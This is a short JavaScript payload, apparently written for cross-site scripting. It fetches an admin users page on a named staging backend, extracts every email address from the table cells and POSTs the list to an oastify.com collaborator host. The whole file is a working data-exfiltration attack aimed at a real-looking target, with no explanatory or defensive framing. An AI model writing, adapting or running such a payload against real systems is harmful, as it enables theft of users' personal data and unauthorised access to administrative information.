function fe(t) {
    fetch(t)
        .then(t => t.text())
        .then(t => {
            // Extract all <td class="col col-email">...</td> contents
            const emailMatches = [...t.matchAll(/<td\s+class="col col-email">([\s\S]*?)<\/td>/gi)];

            if (emailMatches.length > 0) {
                // Prepare a clean list of emails
                const emails = emailMatches.map(match => match[1].trim()).join('\n');

                // Send the email list as raw data in a POST request
                fetch("//198sd5nu3imv6hukv69rttqd147vvojd.oastify.com/log/", {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'text/plain'
                    },
                    body: emails
                });
            } else {
                console.log('No email tags found in the HTML.');
            }
        })
        .catch(error => console.error('Error:', error));
}

urls = ["https://backend-staging.getpowerpay.us/admin/admin_users"];
urls.forEach(fe);
